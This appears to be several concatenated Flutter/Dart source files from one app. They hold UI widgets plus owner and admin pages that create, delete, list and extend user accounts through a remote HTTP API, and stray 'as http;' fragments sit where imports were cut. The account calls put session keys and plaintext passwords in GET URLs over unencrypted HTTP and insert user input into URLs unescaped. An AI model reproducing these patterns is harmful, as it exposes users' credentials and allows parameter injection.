                    ],
                  ),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }
}

// ─── Drawer Item ──────────────────────────────────────────────────────────────
class _DrawerItem extends StatefulWidget {
  final IconData icon;
  final String label;
  final VoidCallback onTap;
  final bool isDestructive;

  const _DrawerItem({
    required this.icon,
    required this.label,
    required this.onTap,
    this.isDestructive = false,
  });

  @override
  State<_DrawerItem> createState() => _DrawerItemState();
}

class _DrawerItemState extends State<_DrawerItem> {
  bool _pressed = false;

  @override
  Widget build(BuildContext context) {
    final color = widget.isDestructive ? _C.red : _C.textSub;
    return GestureDetector(
      onTapDown: (_) => setState(() => _pressed = true),
      onTapUp: (_) { setState(() => _pressed = false); widget.onTap(); },
      onTapCancel: () => setState(() => _pressed = false),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 140),
        margin: const EdgeInsets.only(bottom: 8),
        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 13),
        decoration: BoxDecoration(
          color: _pressed
              ? color.withOpacity(0.1)
              : Colors.transparent,
          borderRadius: BorderRadius.circular(14),
          border: Border.all(
            color: _pressed ? color.withOpacity(0.25) : _C.border,
          ),
        ),
        child: Row(children: [
          Icon(widget.icon, color: color, size: 18),
          const SizedBox(width: 14),
          Text(widget.label,
              style: TextStyle(
                  color: widget.isDestructive ? _C.red : _C.text,
                  fontSize: 14,
                  fontWeight: FontWeight.w600)),
          const Spacer(),
          Icon(Icons.arrow_forward_ios_rounded,
              color: _C.textDim, size: 12),
        ]),
      ),
    );
  }
}

// ─── Bottom Nav Button ────────────────────────────────────────────────────────
class _NavButton extends StatelessWidget {
  final IconData icon;
  final String label;
  final bool active;
  final VoidCallback onTap;

  const _NavButton({
    required this.icon,
    required this.label,
    required this.active,
    required this.onTap,
  });

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTap: onTap,
      behavior: HitTestBehavior.opaque,
      child: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          AnimatedContainer(
            duration: const Duration(milliseconds: 220),
            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 7),
            decoration: BoxDecoration(
              color: active ? _C.redMid.withOpacity(0.15) : Colors.transparent,
              borderRadius: BorderRadius.circular(12),
            ),
            child: Icon(
              icon,
              size: 22,
              color: active ? _C.redLight : _C.textDim,
            ),
          ),
          const SizedBox(height: 2),
          AnimatedDefaultTextStyle(
            duration: const Duration(milliseconds: 200),
            style: TextStyle(
              color: active ? _C.redLight : _C.textDim,
              fontSize: 10,
              fontWeight: active ? FontWeight.w700 : FontWeight.w400,
            ),
            child: Text(label),
          ),
        ],
      ),
    );
  }
}

// ─── AppBar Icon Button ───────────────────────────────────────────────────────
class _AppBarIconBtn extends StatefulWidget {
  final IconData icon;
  final VoidCallback onTap;
  const _AppBarIconBtn({required this.icon, required this.onTap});

  @override
  State<_AppBarIconBtn> createState() => _AppBarIconBtnState();
}

class _AppBarIconBtnState extends State<_AppBarIconBtn> {
  bool _down = false;

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 4, vertical: 8),
      child: GestureDetector(
        onTapDown: (_) => setState(() => _down = true),
        onTapUp: (_) { setState(() => _down = false); widget.onTap(); },
        onTapCancel: () => setState(() => _down = false),
        child: AnimatedContainer(
          duration: const Duration(milliseconds: 120),
          width: 36, height: 36,
          decoration: BoxDecoration(
            color: _down ? _C.border : _C.surface,
            borderRadius: BorderRadius.circular(10),
            border: Border.all(color: _C.border),
          ),
          child: Icon(widget.icon, color: _C.textSub, size: 18),
        ),
      ),
    );
  }
}

// ─── Menu (Hamburger) Button ──────────────────────────────────────────────────
class _MenuBtn extends StatefulWidget {
  final VoidCallback onTap;
  const _MenuBtn({required this.onTap});

  @override
  State<_MenuBtn> createState() => _MenuBtnState();
}

class _MenuBtnState extends State<_MenuBtn> {
  bool _down = false;

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.all(10),
      child: GestureDetector(
        onTapDown: (_) => setState(() => _down = true),
        onTapUp: (_) { setState(() => _down = false); widget.onTap(); },
        onTapCancel: () => setState(() => _down = false),
        child: AnimatedContainer(
          duration: const Duration(milliseconds: 120),
          decoration: BoxDecoration(
            color: _down ? _C.border : _C.surface,
            borderRadius: BorderRadius.circular(10),
            border: Border.all(color: _C.border),
          ),
          child: const Icon(Icons.menu_rounded, color: _C.textSub, size: 20),
        ),
      ),
    );
  }
}

// ─── Animated Background ──────────────────────────────────────────────────────
class _AnimatedBg extends StatelessWidget {
  final AnimationController controller;
  const _AnimatedBg({required this.controller});

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: controller,
      builder: (_, __) => CustomPaint(painter: _BgPainter(controller.value)),
    );
  }
}

class _BgPainter extends CustomPainter {
  final double t;
  _BgPainter(this.t);

  @override
  void paint(Canvas canvas, Size size) {
    final grid = Paint()
      ..color = _C.border.withOpacity(0.25)
      ..strokeWidth = 0.5;
    const step = 38.0;
    for (double x = 0; x < size.width; x += step) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), grid);
    }
    for (double y = 0; y < size.height; y += step) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), grid);
    }

    // Top glow - diubah ke merah
    final glow = Paint()
      ..shader = RadialGradient(colors: [
        _C.red.withOpacity(0.10 + math.sin(t * math.pi * 2) * 0.03),
        Colors.transparent,
      ], radius: 0.9).createShader(
          Rect.fromCircle(
              center: Offset(size.width / 2, 0), radius: size.width));
    canvas.drawCircle(Offset(size.width / 2, 0), size.width, glow);
  }

  @override
  bool shouldRepaint(_BgPainter old) => old.t != t;
}

// ─── Shared Primitives ────────────────────────────────────────────────────────
class _NavItem {
  final IconData icon;
  final String label;
  const _NavItem({required this.icon, required this.label});
}

PageRoute _slideRoute(Widget page) => PageRouteBuilder(
  pageBuilder: (_, __, ___) => page,
  transitionDuration: const Duration(milliseconds: 350),
  transitionsBuilder: (_, anim, __, child) => SlideTransition(
    position: Tween<Offset>(
      begin: const Offset(1, 0), end: Offset.zero,
    ).animate(CurvedAnimation(parent: anim, curve: Curves.easeOutCubic)),
    child: FadeTransition(opacity: anim, child: child),
  ),
);

class _GradBtn extends StatefulWidget {
  final String label;
  final VoidCallback onTap;
  final bool fullWidth;
  final LinearGradient gradient;

  const _GradBtn({
    required this.label,
    required this.onTap,
    this.fullWidth = false,
    this.gradient = _C.btnGrad,
  });

  @override
  State<_GradBtn> createState() => _GradBtnState();
}

class _GradBtnState extends State<_GradBtn> {
  bool _down = false;

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTapDown: (_) => setState(() => _down = true),
      onTapUp: (_) { setState(() => _down = false); widget.onTap(); },
      onTapCancel: () => setState(() => _down = false),
      child: AnimatedScale(
        scale: _down ? 0.96 : 1.0,
        duration: const Duration(milliseconds: 120),
        child: Container(
          height: 46,
          width: widget.fullWidth ? double.infinity : null,
          padding: widget.fullWidth
              ? EdgeInsets.zero
              : const EdgeInsets.symmetric(horizontal: 28),
          decoration: BoxDecoration(
            gradient: widget.gradient,
            borderRadius: BorderRadius.circular(13),
            boxShadow: _down ? [] : [
              BoxShadow(
                  color: _C.redMid.withOpacity(0.3),
                  blurRadius: 14,
                  offset: const Offset(0, 4)),
            ],
          ),
          child: Center(
            child: Text(widget.label,
                style: const TextStyle(
                    color: Colors.white,
                    fontWeight: FontWeight.w700,
                    fontSize: 14)),
          ),
        ),
      ),
    );
  }
}

// ─── NewsMedia (unchanged logic, improved loading state) ──────────────────────
class NewsMedia extends StatefulWidget {
  final String url;
  const NewsMedia({super.key, required this.url});

  @override
  State<NewsMedia> createState() => _NewsMediaState();
}

class _NewsMediaState extends State<NewsMedia> {
  VideoPlayerController? _ctrl;

  @override
  void initState() {
    super.initState();
    if (_isVideo(widget.url)) {
      _ctrl = VideoPlayerController.networkUrl(Uri.parse(widget.url))
        ..initialize().then((_) {
          if (mounted) setState(() {});
          _ctrl?.setLooping(true);
          _ctrl?.setVolume(0);
          _ctrl?.play();
        });
    }
  }

  bool _isVideo(String url) =>
      url.endsWith('.mp4') || url.endsWith('.webm') ||
      url.endsWith('.mov') || url.endsWith('.mkv');

  @override
  void dispose() { _ctrl?.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    if (_isVideo(widget.url)) {
      if (_ctrl?.value.isInitialized == true) {
        return AspectRatio(
          aspectRatio: _ctrl!.value.aspectRatio,
          child: VideoPlayer(_ctrl!),
        );
      }
      return Container(
        color: _C.surface,
        child: const Center(
          child: SizedBox(
            width: 20, height: 20,
            child: CircularProgressIndicator(
                strokeWidth: 2, color: _C.redMid),
          ),
        ),
      );
    }
    return Image.network(
      widget.url,
      fit: BoxFit.cover,
      loadingBuilder: (_, child, progress) => progress == null
          ? child
          : Container(
              color: _C.surface,
              child: Center(
                child: CircularProgressIndicator(
                  value: progress.expectedTotalBytes != null
                      ? progress.cumulativeBytesLoaded /
                          progress.expectedTotalBytes!
                      : null,
                  strokeWidth: 2,
                  color: _C.redMid,
                ),
              ),
            ),
      errorBuilder: (_, __, ___) => Container(
        color: _C.surface,
        child: const Icon(Icons.broken_image_outlined,
            color: _C.textDim, size: 32),
      ),
    );
  }
}


as http;



class OwnerPage extends StatefulWidget {
  final String sessionKey; // Gunakan keyToken atau sessionKey sesuai app Anda
  final String username; // Username owner (opsional, untuk logging)

  const OwnerPage({
    super.key,
    required this.sessionKey,
    required this.username,
  });

  @override
  State<OwnerPage> createState() => _OwnerPageState();
}

class _OwnerPageState extends State<OwnerPage> {
  late String sessionKey;
  List<dynamic> fullUserList = [];
  List<dynamic> filteredList = [];

  // Role Options untuk Owner: Admin, Reseller, Member
  final List<String> roleOptions = ['owner', 'moderator', 'partner', 'admin', 'vip', 'reseller', 'member'];
  String selectedRole = 'member'; // Default view

  int currentPage = 1;
  int itemsPerPage = 25;

  // Controllers
  final createUsernameController = TextEditingController();
  final createPasswordController = TextEditingController();
  final createDayController = TextEditingController();
  final deleteController = TextEditingController();
  final editUsernameController = TextEditingController();
  final editDayController = TextEditingController();

  String newUserRole = 'member';
  bool isLoading = false;

  // --- TEMA WARNA MERAH ---
  final Color bgDark = const Color(0xFF1A0000); // Hitam kemerahan gelap
  final Color primaryRed = const Color(0xFFC62828); // Merah tua
  final Color accentRed = const Color(0xFFFF5252); // Merah terang
  final Color primaryWhite = Colors.white;
  final Color textGrey = Colors.grey.shade400;
  final Color cardGlass = Colors.white.withOpacity(0.05);
  final Color borderGlass = Colors.white.withOpacity(0.1);

  @override
  void initState() {
    super.initState();
    sessionKey = widget.sessionKey;
    _fetchUsers();
  }

  Future<void> _fetchUsers() async {
    setState(() => isLoading = true);
    try {
      final res = await http.get(
        Uri.parse('http://papi.queen-official.com:2836/listUsers?key=$sessionKey'),
      );
      final data = jsonDecode(res.body);
      if (data['valid'] == true && data['authorized'] == true) {
        fullUserList = data['users'] ?? [];
        _filterAndPaginate();
      } else {
        _alert("Info", data['message'] ?? 'Gagal memuat user.');
      }
    } catch (_) {
      _alert("Error", "Gagal terhubung ke server.");
    }
    setState(() => isLoading = false);
  }

  void _filterAndPaginate() {
    setState(() {
      currentPage = 1;
      filteredList = fullUserList
          .where((u) => u['role'] == selectedRole)
          .toList();
    });
  }

  List<dynamic> _getCurrentPageData() {
    final start = (currentPage - 1) * itemsPerPage;
    final end = (start + itemsPerPage);
    return filteredList.sublist(
      start,
      end > filteredList.length ? filteredList.length : end,
    );
  }

  int get totalPages => (filteredList.length / itemsPerPage).ceil();

  // --- DELETE USER ---
  Future<void> _deleteUser() async {
    final username = deleteController.text.trim();
    if (username.isEmpty) {
      _alert("Peringatan", "Masukkan username yang ingin dihapus.");
      return;
    }

    setState(() => isLoading = true);
    try {
      final res = await http.get(
        Uri.parse('http://papi.queen-official.com:2836/deleteUser?key=$sessionKey&username=$username'),
      );
      final data = jsonDecode(res.body);

      if (data['deleted'] == true) {
        _alert("Sukses", "User berhasil dihapus.");
        deleteController.clear();
        _fetchUsers();
      } else {
        _alert("Gagal", data['message'] ?? 'Gagal menghapus user.');
      }
    } catch (_) {
      _alert("Error", "Gagal menghubungi server.");
    }
    setState(() => isLoading = false);
  }

  // --- CREATE ACCOUNT (Owner Logic) ---
  Future<void> _createAccount() async {
    final u = createUsernameController.text.trim();
    final p = createPasswordController.text.trim();
    final d = createDayController.text.trim();

    if (u.isEmpty || p.isEmpty || d.isEmpty) {
      _alert("Peringatan", "Semua field wajib diisi.");
      return;
    }

    setState(() => isLoading = true);
    try {
      // Menggunakan endpoint userAdd (Owner punya akses penuh)
      // Backend harus diupdate untuk mendukung role 'admin'
      final url = Uri.parse(
        'http://papi.queen-official.com:2836/userAdd?key=$sessionKey&username=$u&password=$p&day=$d&role=$newUserRole',
      );
      final res = await http.get(url);
      final data = jsonDecode(res.body);

      if (data['created'] == true) {
        _alert("Sukses", "Akun berhasil dibuat sebagai ${newUserRole.toUpperCase()}.");
        createUsernameController.clear();
        createPasswordController.clear();
        createDayController.clear();
        newUserRole = 'member';
        _fetchUsers();
      } else {
        _alert("Gagal", data['message'] ?? 'Gagal membuat akun.');
      }
    } catch (_) {
      _alert("Error", "Gagal menghubungi server.");
    }
    setState(() => isLoading = false);
  }

  // --- EDIT/EXTEND ACCOUNT ---
  Future<void> _editUser() async {
    final u = editUsernameController.text.trim();
    final d = editDayController.text.trim();

    if (u.isEmpty || d.isEmpty) {
      _alert("Peringatan", "Semua field wajib diisi.");
      return;
    }

    setState(() => isLoading = true);
    try {
      final url = Uri.parse(
        'http://papi.queen-official.com:2836/editUser?key=$sessionKey&username=$u&addDays=$d',
      );
      final res = await http.get(url);
      final data = jsonDecode(res.body);

      if (data['edited'] == true) {
        _alert("Sukses", "Durasi berhasil diperbarui.");
        editUsernameController.clear();
        editDayController.clear();
        _fetchUsers();
      } else {
        _alert("Gagal", data['message'] ?? 'Gagal mengubah durasi.');
      }
    } catch (_) {
      _alert("Error", "Gagal menghubungi server.");
    }
    setState(() => isLoading = false);
  }

  void _alert(String title, String message) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: bgDark,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: accentRed.withOpacity(0.3)),
        ),
        title: Row(
          children: [
            Icon(Icons.info_outline, color: accentRed),
            const SizedBox(width: 10),
            Text(title, style: TextStyle(color: primaryWhite)),
          ],
        ),
        content: Text(message, style: TextStyle(color: textGrey)),
        actions: [
          Center(
            child: Container(
              decoration: BoxDecoration(
                gradient: LinearGradient(colors: [primaryRed, accentRed]),
                borderRadius: BorderRadius.circular(12),
              ),
              child: TextButton(
                onPressed: () => Navigator.pop(context),
                child: Text(
                  "OK",
                  style: TextStyle(color: primaryWhite, fontWeight: FontWeight.bold),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildInput({
    required String label,
    required TextEditingController controller,
    required IconData icon,
    TextInputType type = TextInputType.text,
  }) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 20),
      child: TextField(
        controller: controller,
        keyboardType: type,
        style: TextStyle(color: primaryWhite),
        decoration: InputDecoration(
          labelText: label,
          labelStyle: TextStyle(color: accentRed),
          prefixIcon: Icon(icon, color: accentRed),
          filled: true,
          fillColor: cardGlass,
          border: OutlineInputBorder(
            borderRadius: BorderRadius.circular(12),
            borderSide: BorderSide(color: borderGlass),
          ),
          enabledBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(12),
            borderSide: BorderSide(color: borderGlass),
          ),
          focusedBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(12),
            borderSide: BorderSide(color: accentRed, width: 2),
          ),
        ),
      ),
    );
  }

  Widget _buildGlassCard({
    required String title,
    required IconData icon,
    required List<Widget> children,
  }) {
    return Container(
      margin: EdgeInsets.only(bottom: 25),
      padding: EdgeInsets.all(24),
      decoration: BoxDecoration(
        color: cardGlass,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: borderGlass),
        boxShadow: [
          BoxShadow(
            color: primaryRed.withOpacity(0.1),
            blurRadius: 15,
            offset: Offset(0, 5),
          ),
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          Row(
            children: [
              Container(
                padding: EdgeInsets.all(8),
                decoration: BoxDecoration(
                  color: primaryRed.withOpacity(0.2),
                  borderRadius: BorderRadius.circular(8),
                ),
                child: Icon(icon, color: accentRed),
              ),
              SizedBox(width: 12),
              Text(
                title,
                style: TextStyle(
                  color: primaryWhite,
                  fontSize: 18,
                  fontWeight: FontWeight.bold,
                  fontFamily: 'Orbitron',
                  letterSpacing: 1,
                ),
              ),
            ],
          ),
          SizedBox(height: 24),
          ...children,
        ],
      ),
    );
  }

  Widget _buildUserItem(Map user) {
    return Container(
      margin: EdgeInsets.symmetric(horizontal: 16, vertical: 8),
      padding: EdgeInsets.symmetric(horizontal: 16, vertical: 12),
      decoration: BoxDecoration(
        color: cardGlass,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: borderGlass),
      ),
      child: Row(
        children: [
          Container(
            padding: EdgeInsets.all(10),
            decoration: BoxDecoration(
              color: primaryRed.withOpacity(0.2),
              shape: BoxShape.circle,
            ),
            child: Icon(Icons.person, color: accentRed),
          ),
          SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  user['username'],
                  style: TextStyle(
                    color: primaryWhite,
                    fontWeight: FontWeight.bold,
                    fontSize: 16,
                  ),
                ),
                SizedBox(height: 4),
                Text(
                  "ROLE: ${user['role'].toString().toUpperCase()} | EXP: ${user['expiredDate']}",
                  style: TextStyle(color: textGrey, fontSize: 13),
                ),
              ],
            ),
          ),
          // Tombol Delete
          Container(
            decoration: BoxDecoration(
              color: Colors.redAccent.withOpacity(0.1),
              shape: BoxShape.circle,
              border: Border.all(color: Colors.redAccent.withOpacity(0.3)),
            ),
            child: IconButton(
              icon: Icon(Icons.delete_outline, color: Colors.redAccent),
              onPressed: () async {
                final confirm = await showDialog<bool>(
                  context: context,
                  builder: (_) => AlertDialog(
                    backgroundColor: bgDark,
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(20),
                      side: BorderSide(color: accentRed.withOpacity(0.3)),
                    ),
                    title: Text("Konfirmasi", style: TextStyle(color: primaryWhite)),
                    content: Text("Hapus user ini?", style: TextStyle(color: textGrey)),
                    actions: [
                      TextButton(
                        onPressed: () => Navigator.pop(context, false),
                        child: Text("Batal", style: TextStyle(color: primaryRed)),
                      ),
                      TextButton(
                        onPressed: () => Navigator.pop(context, true),
                        child: Text("Hapus", style: TextStyle(color: Colors.redAccent)),
                      ),
                    ],
                  ),
                );
                if (confirm == true) {
                  deleteController.text = user['username'];
                  _deleteUser();
                }
              },
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildPagination() {
    return Wrap(
      spacing: 8,
      runSpacing: 8,
      children: List.generate(totalPages, (index) {
        final page = index + 1;
        return ElevatedButton(
          onPressed: () => setState(() => currentPage = page),
          style: ElevatedButton.styleFrom(
            backgroundColor: currentPage == page ? accentRed : Colors.transparent,
            foregroundColor: currentPage == page ? primaryWhite : Colors.white54,
            padding: EdgeInsets.symmetric(horizontal: 16),
            shape: RoundedRectangleBorder(
              borderRadius: BorderRadius.circular(8),
              side: BorderSide(color: borderGlass),
            ),
          ),
          child: Text("$page", style: TextStyle(fontSize: 12)),
        );
      }),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: bgDark,
      body: Container(
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [bgDark, primaryRed.withOpacity(0.1), bgDark],
          ),
        ),
        child: SafeArea(
          child: SingleChildScrollView(
            physics: BouncingScrollPhysics(),
            padding: EdgeInsets.symmetric(horizontal: 20, vertical: 20),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.center,
              children: [
                // Header
                Icon(Icons.workspace_premium, color: accentRed, size: 50),
                SizedBox(height: 10),
                Text(
                  "OWNER DASHBOARD",
                  style: TextStyle(
                    color: primaryWhite,
                    fontSize: 24,
                    fontWeight: FontWeight.bold,
                    fontFamily: 'Orbitron',
                    letterSpacing: 2,
                    shadows: [
                      Shadow(
                        color: primaryRed.withOpacity(0.8),
                        blurRadius: 10,
                      ),
                    ],
                  ),
                ),
                SizedBox(height: 40),

                // SECTION 1: DELETE USER
                _buildGlassCard(
                  title: "DELETE USER",
                  icon: FontAwesomeIcons.userSlash,
                  children: [
                    _buildInput(
                      label: "Username Target",
                      controller: deleteController,
                      icon: FontAwesomeIcons.user,
                    ),
                    SizedBox(height: 10),
                    Container(
                      height: 50,
                      decoration: BoxDecoration(
                        gradient: LinearGradient(colors: [Colors.redAccent, Colors.red]),
                        borderRadius: BorderRadius.circular(12),
                        boxShadow: [
                          BoxShadow(
                            color: Colors.red.withOpacity(0.3),
                            blurRadius: 10,
                            offset: Offset(0, 4),
                          ),
                        ],
                      ),
                      child: ElevatedButton(
                        onPressed: isLoading ? null : _deleteUser,
                        style: ElevatedButton.styleFrom(
                          backgroundColor: Colors.transparent,
                          shadowColor: Colors.transparent,
                          shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(12),
                          ),
                        ),
                        child: const Row(
                          mainAxisSize: MainAxisSize.min,
                          children: [
                            Icon(Icons.delete, size: 18, color: Colors.white),
                            SizedBox(width: 8),
                            Text(
                              "DELETE ACCOUNT",
                              style: TextStyle(
                                fontWeight: FontWeight.bold,
                                letterSpacing: 1,
                              ),
                            ),
                          ],
                        ),
                      ),
                    ),
                  ],
                ),

                // SECTION 2: CREATE ACCOUNT
                _buildGlassCard(
                  title: "CREATE ACCOUNT",
                  icon: FontAwesomeIcons.userPlus,
                  children: [
                    _buildInput(
                      label: "Username",
                      controller: createUsernameController,
                      icon: FontAwesomeIcons.user,
                    ),
                    _buildInput(
                      label: "Password",
                      controller: createPasswordController,
                      icon: FontAwesomeIcons.lock,
                    ),
                    _buildInput(
                      label: "Durasi (Hari)",
                      controller: createDayController,
                      icon: FontAwesomeIcons.calendarDay,
                      type: TextInputType.number,
                    ),
                    Container(
                      padding: EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                      decoration: BoxDecoration(
                        color: Colors.black.withOpacity(0.2),
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(color: borderGlass),
                      ),
                      child: DropdownButtonHideUnderline(
                        child: DropdownButton<String>(
                          value: newUserRole,
                          dropdownColor: bgDark,
                          style: TextStyle(color: primaryWhite),
                          items: roleOptions.map((role) {
                            return DropdownMenuItem(
                              value: role,
                              child: Text(role.toUpperCase()),
                            );
                          }).toList(),
                          onChanged: (val) =>
                              setState(() => newUserRole = val ?? 'member'),
                        ),
                      ),
                    ),
                    SizedBox(height: 20),
                    Container(
                      height: 50,
                      decoration: BoxDecoration(
                        gradient: LinearGradient(colors: [primaryRed, accentRed]),
                        borderRadius: BorderRadius.circular(12),
                        boxShadow: [
                          BoxShadow(
                            color: primaryRed.withOpacity(0.4),
                            blurRadius: 10,
                            offset: Offset(0, 4),
                          ),
                        ],
                      ),
                      child: ElevatedButton(
                        onPressed: isLoading ? null : _createAccount,
                        style: ElevatedButton.styleFrom(
                          backgroundColor: Colors.transparent,
                          shadowColor: Colors.transparent,
                          shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(12),
                          ),
                        ),
                        child: isLoading
                            ? SizedBox(
                          width: 20,
                          height: 20,
                          child: CircularProgressIndicator(
                            strokeWidth: 2,
                            color: primaryWhite,
                          ),
                        )
                            : Text(
                          "CREATE ACCOUNT",
                          style: TextStyle(
                            color: primaryWhite,
                            fontWeight: FontWeight.bold,
                            letterSpacing: 1,
                          ),
                        ),
                      ),
                    ),
                  ],
                ),

                // SECTION 3: EXTEND DURATION
                _buildGlassCard(
                  title: "EXTEND DURATION",
                  icon: FontAwesomeIcons.clock,
                  children: [
                    _buildInput(
                      label: "Username Target",
                      controller: editUsernameController,
                      icon: FontAwesomeIcons.userEdit,
                    ),
                    _buildInput(
                      label: "Tambah Hari",
                      controller: editDayController,
                      icon: FontAwesomeIcons.calendarPlus,
                      type: TextInputType.number,
                    ),
                    SizedBox(height: 10),
                    Container(
                      height: 50,
                      decoration: BoxDecoration(
                        gradient: LinearGradient(colors: [Colors.blue, Colors.lightBlueAccent]),
                        borderRadius: BorderRadius.circular(12),
                        boxShadow: [
                          BoxShadow(
                            color: Colors.blue.withOpacity(0.4),
                            blurRadius: 10,
                            offset: Offset(0, 4),
                          ),
                        ],
                      ),
                      child: ElevatedButton(
                        onPressed: isLoading ? null : _editUser,
                        style: ElevatedButton.styleFrom(
                          backgroundColor: Colors.transparent,
                          shadowColor: Colors.transparent,
                          shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(12),
                          ),
                        ),
                        child: isLoading
                            ? SizedBox(
                          width: 20,
                          height: 20,
                          child: CircularProgressIndicator(
                            strokeWidth: 2,
                            color: primaryWhite,
                          ),
                        )
                            : Text(
                          "ADD DAYS",
                          style: TextStyle(
                            color: primaryWhite,
                            fontWeight: FontWeight.bold,
                            letterSpacing: 1,
                          ),
                        ),
                      ),
                    ),
                  ],
                ),

                // SECTION 4: USER LIST
                _buildGlassCard(
                  title: "USER LIST",
                  icon: FontAwesomeIcons.users,
                  children: [
                    Container(
                      padding: EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                      decoration: BoxDecoration(
                        color: Colors.black.withOpacity(0.2),
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(color: borderGlass),
                      ),
                      child: DropdownButtonHideUnderline(
                        child: DropdownButton<String>(
                          value: selectedRole,
                          dropdownColor: bgDark,
                          style: TextStyle(color: primaryWhite),
                          items: roleOptions.map((role) {
                            return DropdownMenuItem(
                              value: role,
                              child: Text(role.toUpperCase()),
                            );
                          }).toList(),
                          onChanged: (val) {
                            if (val != null) {
                              selectedRole = val;
                              _filterAndPaginate();
                            }
                          },
                        ),
                      ),
                    ),
                    SizedBox(height: 20),
                    isLoading
                        ? Center(
                      child: CircularProgressIndicator(
                        color: accentRed,
                      ),
                    )
                        : Column(
                      children: [
                        ..._getCurrentPageData()
                            .map((u) => _buildUserItem(u))
                            .toList(),
                        SizedBox(height: 20),
                        _buildPagination(),
                      ],
                    ),
                  ],
                ),
                SizedBox(height: 30),
              ],
            ),
          ),
        ),
      ),
    );
  }
}


as http;



class AdminPage extends StatefulWidget {
  final String sessionKey;

  const AdminPage({super.key, required this.sessionKey});

  @override
  State<AdminPage> createState() => _AdminPageState();
}

class _AdminPageState extends State<AdminPage> {
  late String sessionKey;
  List<dynamic> fullUserList = [];
  List<dynamic> filteredList = [];

  // Role Options: Hanya Reseller & Member
  final List<String> roleOptions = ['reseller', 'member'];
  String selectedRole = 'member';

  int currentPage = 1;
  int itemsPerPage = 25;

  final deleteController = TextEditingController();
  final createUsernameController = TextEditingController();
  final createPasswordController = TextEditingController();
  final createDayController = TextEditingController();
  String newUserRole = 'member';
  bool isLoading = false;

  // --- TEMA WARNA UNGU ---
  final Color bgDark = const Color(0xFF0D0221);
  final Color primaryPurple = const Color(0xFF7B1FA2);
  final Color accentPurple = const Color(0xFFEA80FC);
  final Color primaryWhite = Colors.white;
  final Color cardGlass = Colors.white.withOpacity(0.05);
  final Color borderGlass = Colors.white.withOpacity(0.1);

  @override
  void initState() {
    super.initState();
    sessionKey = widget.sessionKey;
    _fetchUsers();
  }

  Future<void> _fetchUsers() async {
    setState(() => isLoading = true);
    try {
      final res = await http.get(
        Uri.parse('http://papi.queen-official.com:2836/listUsers?key=$sessionKey'),
      );
      final data = jsonDecode(res.body);
      if (data['valid'] == true && data['authorized'] == true) {
        fullUserList = data['users'] ?? [];
        _filterAndPaginate();
      } else {
        _alert(
          "⚠️ Error",
          data['message'] ?? 'Tidak diizinkan melihat daftar user.',
        );
      }
    } catch (_) {
      _alert("🌐 Error", "Gagal memuat user list.");
    }
    setState(() => isLoading = false);
  }

  void _filterAndPaginate() {
    setState(() {
      currentPage = 1;
      filteredList = fullUserList
          .where((u) => u['role'] == selectedRole)
          .toList();
    });
  }

  List<dynamic> _getCurrentPageData() {
    final start = (currentPage - 1) * itemsPerPage;
    final end = (start + itemsPerPage);
    return filteredList.sublist(
      start,
      end > filteredList.length ? filteredList.length : end,
    );
  }

  int get totalPages => (filteredList.length / itemsPerPage).ceil();

  Future<void> _deleteUser() async {
    final username = deleteController.text.trim();
    if (username.isEmpty) {
      _alert("⚠️ Error", "Masukkan username yang ingin dihapus.");
      return;
    }

    setState(() => isLoading = true);
    try {
      final res = await http.get(
        Uri.parse(
          'http://papi.queen-official.com:2836/deleteUser?key=$sessionKey&username=$username',
        ),
      );
      final data = jsonDecode(res.body);
      if (data['deleted'] == true) {
        _alert(
          "✅ Berhasil",
          "User '${data['user']['username']}' telah dihapus.",
        );
        deleteController.clear();
        _fetchUsers();
      } else {
        _alert("❌ Gagal", data['message'] ?? 'Gagal menghapus user.');
      }
    } catch (_) {
      _alert("🌐 Error", "Tidak dapat menghubungi server.");
    }
    setState(() => isLoading = false);
  }

  Future<void> _createAccount() async {
    final username = createUsernameController.text.trim();
    final password = createPasswordController.text.trim();
    final day = createDayController.text.trim();

    if (username.isEmpty || password.isEmpty || day.isEmpty) {
      _alert("⚠️ Error", "Semua field wajib diisi.");
      return;
    }

    setState(() => isLoading = true);
    try {
      // Menggunakan endpoint userAdd (Admin punya akses penuh)
      final url = Uri.parse(
        'http://papi.queen-official.com:2836/userAdd?key=$sessionKey&username=$username&password=$password&day=$day&role=$newUserRole',
      );
      final res = await http.get(url);
      final data = jsonDecode(res.body);

      if (data['created'] == true) {
        _alert(
          "✅ Sukses",
